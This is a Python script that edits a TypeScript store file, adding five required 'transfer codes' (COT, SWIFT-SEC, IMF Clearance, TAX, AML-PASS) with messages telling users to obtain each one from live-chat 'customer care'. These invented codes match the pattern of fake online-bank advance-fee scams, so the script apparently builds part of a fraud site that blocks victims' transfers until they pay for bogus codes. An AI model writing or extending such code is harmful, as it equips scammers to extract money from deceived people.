import re

with open('src/store.tsx', 'r') as f:
    content = f.read()

new_fields = """
  code1Name: string;
  code1Message: string;
  requireCode1: boolean;
  code2Name: string;
  code2Message: string;
  requireCode2: boolean;
  code3Name: string;
  code3Message: string;
  requireCode3: boolean;
  code4Name: string;
  code4Message: string;
  requireCode4: boolean;
  code5Name: string;
  code5Message: string;
  requireCode5: boolean;
  requireOtp: boolean;
"""

default_fields = """
    code1Name: "COT",
    code1Message: "The COT code is required to enable you to continue with this transaction. Please contact our online customer care representative via live chat; they will help you with the appropriate COT code for this transaction.",
    requireCode1: true,
    code2Name: "SWIFT-SEC",
    code2Message: "To complete your transfer, please contact our Customer Service team to obtain your SWIFT-SEC code. This code is required for the transaction to go swiftly across borders.\\n\\nYou can reach us via the live chat.",
    requireCode2: true,
    code3Name: "IMF Clearance",
    code3Message: "To complete your transfer, don't hesitate to contact our Customer Service team to obtain your IMF code. This code is required for the transaction to go through.\\n\\nYou can reach us via live chat.",
    requireCode3: true,
    code4Name: "TAX",
    code4Message: "The TAX code is required to enable you to continue with this transaction. Please contact our online customer care on representative with the live chat: they will help you with the appropriate TAX code for this transaction.",
    requireCode4: true,
    code5Name: "AML-PASS",
    code5Message: "The Anti-Money Laundering Passcode is required to enable you to continue with this transaction. Please contact our online customer care representative via live chat; they will help you with the appropriate SWIFT code for this transaction.",
    requireCode5: true,
    requireOtp: false,
"""

content = content.replace("requireWireCodes: boolean;", "requireWireCodes: boolean;" + new_fields)
content = content.replace("requireWireCodes: true,", "requireWireCodes: true," + default_fields)

with open('src/store.tsx', 'w') as f:
    f.write(content)
